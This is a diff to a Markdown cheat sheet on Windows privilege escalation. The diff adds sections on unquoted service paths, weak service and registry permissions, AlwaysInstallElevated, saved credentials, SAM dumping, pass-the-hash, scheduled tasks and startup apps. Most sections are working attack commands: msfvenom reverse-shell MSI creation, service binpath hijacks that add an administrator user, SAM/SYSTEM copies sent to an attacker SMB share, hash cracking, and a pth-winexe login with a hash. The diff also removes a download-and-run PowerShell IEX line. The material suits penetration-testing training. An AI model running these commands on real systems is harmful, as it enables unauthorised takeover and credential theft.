@@ -17,6 +17,8 @@
     - [Always Install Elevated](#always-install-elevated)
     - [Insecure Service Permissions](#insecure-service-permissions)
     - [Insecure Registry Permissions](#insecure-registry-permissions)
+    - [Weak Registry Permissions](#weak-registry-permissions)
+    - [Insecure Service Executables](#insecure-service-executables)
     - [Token Manipulation](#token-manipulation)
     - [Potatoes](#potatoes)
       - [Hot Potatoe](#hot-potatoe)
@@ -24,7 +26,15 @@
       - [Juicy Potato](#juicy-potato)
     - [Autologon User Credentials](#autologon-user-credentials)
     - [Autoruns](#autoruns)
+    - [AlwaysInstallElevated](#alwaysInstallElevated)
     - [Passwords Registry](#passwords-registry)
+    - [Saved Creds](#saved-creds)
+    - [Security Account Manager](#security-account-manager)
+    - [Pass the Hash](#pass-the-hash)
+    - [Scheduled Tasks](#scheduled-tasks)
+    - [Insecure GUI Apps](#insecure-gui-apps)
+    - [Startup Apps](#startup-apps)
+    - [DLL Hijacking](#dll-hijacking)
     - [Security Account Manager Passwords](#security-account-manager-passwords)
   - [Lateral movement](#lateral-movement)
     - [Powershell Remoting](#powershell-remoting)
@@ -250,20 +260,35 @@ Enumerate Local Applocker Effective Policy `Get-AppLockerPolicy -Effective | sel
 - SeImpersonate & SeAssignPrimaryToken Priv.
 
 `whoami /groups`
+
 `net user`
+
 `netstat -ano`
+
 `ipconfig /all`
+
 `route print`
+
 `tasklist /SVC > tasks.txt`
+
 `schtasks /query /fo LIST /v > schedule.txt`
+
 `netsh advfirewall show currentprofile`
+
 `netsh advfirewall firewall show rule name=all`
+
 `wmic product get name, version, vendor > apps_versions.txt`
+
 `DRIVERQUERY`
+
 `mountvol`
+
 `accesschk.exe /accepteula`
+
 `accesschk.exe -uws "Everyone" "C:\Program Files"`
+
 `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
+
 `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
 
 Stored Credentials
@@ -279,7 +304,7 @@ Local administrators passwords can also retrieved via the Group Policy Preferenc
 
 `????\SYSVOL\Policies????\MACHINE\Preferences\Groups\Groups.xml`
 
-Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:
+Except of the Group.xml file, the password attribute can be found in other policy preference files as well such as:
 
 `Services\Services.xml`
 `ScheduledTasks\ScheduledTasks.xml`
@@ -305,21 +330,13 @@ While it’s a good idea to search the entire drive, Unattend files are likely t
 `C:\Windows\system32\sysprep.inf`
 `C:\Windows\system32\sysprep\sysprep.xml`
 
-`If you find one open it and search for tag. Stored as plaintext or base64.`
+`If you find one, open it and search for tag. Stored as plaintext or base64.`
 
 ### Kernel Exploits
 
 WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
 
 Use [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
-
-Serlock
-
-Config: Add to the last line the "Find-AllVulns"
-Download and run Sherlock:
-
-`echo IEX(New-Object Net.WebClient).DownloadString('http://:/Sherlock.ps1') | powershell -noprofile -`
-
 
 ### Applications and Drivers Exploits
 
@@ -337,7 +354,7 @@ Always use https://download.sysinternals.com/files/AccessChk.zip to check the pe
 
 Search for world writable files and directories:
 
-`accesschk.exe -uws "Everyone" "C:\Progrma Files"`
+`accesschk.exe -uws "Everyone" "C:\Program Files"`
 
 `powershell: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`
 
@@ -349,13 +366,41 @@ Find running proccess:
 
 ### Unquoted Service Path
 
+This happens when the binary doesn't have the quotes properly placed.
 Discover all the services that are running on the target host and identify those that are not enclosed inside quotes:
 
-`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
+`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"`
 
 The next step is to try to identify the level of privilege that this service is running. This can be identified easily:
 
-`sc qc "<service name>"`
+```powershell
+$ sc qc unquotedsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: unquotedsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe   <---------
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Unquoted Path Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+In this case Windows will try every possible executable in this path:
+
+C:\Program.exe
+C:\Program Files.exe
+C:\Program Files\Unquoted.exe 
+
+Copying the file and starting the service
+
+```powershell
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+net start unquotedsvc
+```
 
 ### Always Install Elevated
 
@@ -367,6 +412,18 @@ If they return output then vulnerability exists:
 
 ### Insecure Service Permissions
 
+Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.
+
+1. Insecure Service Properties
+2. Unquoted Service Path
+3. Weak Registry Permissions
+4. Insecure Service Executables
+5. DLL Hijacking
+
+> If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
+
+> “Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!”
+
 Detect is to find a service with weak permissions
 
 `accesschk.exe -uwcqv *`
@@ -374,22 +431,39 @@ Detect is to find a service with weak permissions
 For Shorten output
 
 `accesschk.exe -uwcqv "Authenticated Users" *`
+
 `accesschk.exe -uwcqv "Everyone" *`
 
 The output will be the service name, the group name and the permissions that group has. Anything like SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS is a win. In fact any of the following permissions are worth looking out for:
 
 `SERVICE_CHANGE_CONFIG`
+
 `SERVICE_ALL_ACCESS`
+
 `GENERIC_WRITE`
+
 `GENERIC_ALL`
+
 `WRITE_DAC`
+
 `WRITE_OWNER`
 
 If you have reconfiguration permissions, or can get them through the above permission list, then you can use the SC command to exploit the vulnerability:
 
-`sc config SERVICENAME binPath= "E:\Service.exe"`
-`sc config SERVICENAME obj=".\LocalSystem" password=""`
+```powershell
+sc config SERVICE binpath= "\"PATH OF OUR REVERSE SHELL\""
+
+or adding out own user
+
+sc config daclsvc binpath= "net localgroup administrators user /add"
+```
+
+To check if we where added to the admin group
+
+`net localgroup administrators`
+
 `net stop SERVICENAME`
+
 `net start SERVICENAME`
 
 Stop and start the service again and you’re a Local Admin!
@@ -424,6 +498,57 @@ start service:
 
 `net start`
 
+### Weak Registry Permissions
+
+> The Windows registry stores entries for each service.
+Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.
+
+> To exploit this we have two possible ways, one we can remove the existing exe file and replace with our rev.exe to get reverse shell and two we have to modify the registry path itself to our rev.exe file.
+
+
+Check the directory permissions
+
+```powershell
+.\accesschk.exe /accepteula -dvwq "C:\program files\insecure registry service\"
+```
+
+Check services permissions
+
+```powershell
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+or
+
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+```
+
+To check ALL registries, we can do:
+
+```powershell
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services
+```
+
+Change registry imagepath
+
+```powershell
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+```
+
+```powershell
+sc start regsvc
+```
+
+### Insecure Service Executables
+
+
+In case we have  READ/WRITE permission over the folder of the service, we can simply do:
+
+```powershell
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+```
+
+To be root
+
 ### Token Manipulation
 
 whoami /priv
@@ -438,6 +563,30 @@ whoami /priv
 - SeImpersonate & SeAssignPrimaryToken Priv.
 
 ### Potatoes
+
+If the machine is >= Windows 10 1809 & Windows Server 2019 — Try Rogue Potato
+If the machine is < Windows 10 1809 < Windows Server 2019 — Try Juicy Potato
+
+This can only be done if current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.
+
+You can verify if you have privilege to impersonate security tokens
+
+```powershell
+whoami /priv
+```
+
+If we have `SeImpersonatePrivileges` or `SeAssignPrimaryTokenPrivileges` enabled, we can be root.
+
+Note: *PsExec is a command-line tool that lets you execute processes on remote systems and redirect console applications’ output to the local system so that these applications appear to be running locally.*
+
+Potatoes list:
+
+- Hot
+- Rotten
+- Lonely
+- Juicy
+- Rogue
+
 
 #### Hot Potatoe
 
@@ -487,11 +636,13 @@ Usage: https://github.com/ohpe/juicy-potato
 
 ### Autologon User Credentials
 
-Use the following command and if return output take autologon user credentials from regisrty:
+Use the following command and if return output take autologon user credentials from registy:
 
 `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"`
 
 ### Autoruns
+
+> Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
 
 Find auto run executables:
 
@@ -509,7 +660,41 @@ Start a listener on Kali and then restart the Windows VM. Open up a new RDP sess
 
 `rdesktop <ip>`
 
+### AlwaysInstallElevated
+
+> MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.
+
+> "The catch is that two Registry settings must be enabled for this to work.
+The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+If either of these are missing or disabled, the exploit will not work.
+
+Check if you have the permissions
+
+```powershell
+reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer 
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer 
+```
+
+Creating the payload
+
+```powershell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+```
+
+Installing the reverse shell
+
+```powershell
+msiexec /quiet /qn /i PATH_OF_THE_MSI
+```
+
 ### Passwords Registry
+
+
+> Even administrators re-use their passwords, or leave their passwords on systems in readable locations. Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.
+
+> Registry — Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.
 
 The registry can be searched for keys and values that contain the word "password":
 
@@ -523,9 +708,162 @@ On Kali, use the winexe command to spawn a command prompt running with the admin
 
 `winexe -U 'admin%password' //ip_of_victim cmd.exe`
 
+Registry lookup by string `password`
+
+```powershell
+reg query HKLM /f password /t REG_SZ /s
+```
+
+admin AutoLogon credentials
+
+```powershell
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+```
+
+And login
+
+```powershell
+winexe -U 'admin%password' //10.10.93.139 cmd.exe
+```
+
+### Saved Creds
+
+> Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.
+
+
+To list the vaults
+
+```powershell
+cmdkey /list
+``` 
+
+To run command as another user
+
+```powershell
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
+### Security Account Manager
+
+
+> Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes
+
+> The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.
+The files are locked while Windows is running.
+Backups of the files may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack` directories
+
+
+Start the SAMBA listener in your machine
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+```
+
+Copy the SAM files
+
+```powershell
+copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+```
+
+Crack the SAM files
+
+```bash
+git clone https://github.com/Neohapsis/creddump7.git
+python2 creddump7/pwdump.py SYSTEM SAM
+
+hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+```
+
+### Pass the Hash
+
+> Windows accepts hashes instead of passwords to authenticate to a number of services. We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash.
+
+
+```bash
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.93.139 cmd.exe
+```
+
+### Scheduled Tasks
+
+> Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.
+
+
+List all scheduled tasks our user can see.
+
+
+```powershell
+schtasks /query /fo LIST /v
+
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
+Check the privileges
+
+```powershell
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+```
+
+Write our payload into the script
+
+```powershell
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+
+### Insecure GUI Apps
+
+> On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.
+
+> We call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.
+
+List all the processes
+
+```powershell
+tasklist /V | findstr mspaint.exe
+``` 
+
+Get the cmd shell
+
+```powershell
+file://c:/windows/system32/cmd.exe
+``` 
+
+### Startup Apps
+
+> Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.
+
+
+Check if we have permissions, if BUILTIN\Users have write access, then we can become root
+
+```powershell
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+or
+
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+Powershell script to create a startup executable
+
+```powershell
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+```
+
+Now we need for the admin to login into the account
+
+
+### DLL Hijacking
+
+
+We can use procmon from systernals to find missing dlls
+
+In case you found something, go to https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking to continue the exploit.
+
 ### Security Account Manager Passwords
-
-
 
 Transfer the SAM and SYSTEM files to your Kali VM:
 
@@ -594,14 +932,15 @@ Invoke-Command -Session $sess -ScriptBlock {$ps}
 [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
 [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
 [FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges
-
+- winPEASany.exe
+- Seatbelt.exe
+- SharpUp.exe
 
 # Credits
 
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#readme
 
 https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet
-
 
 
 
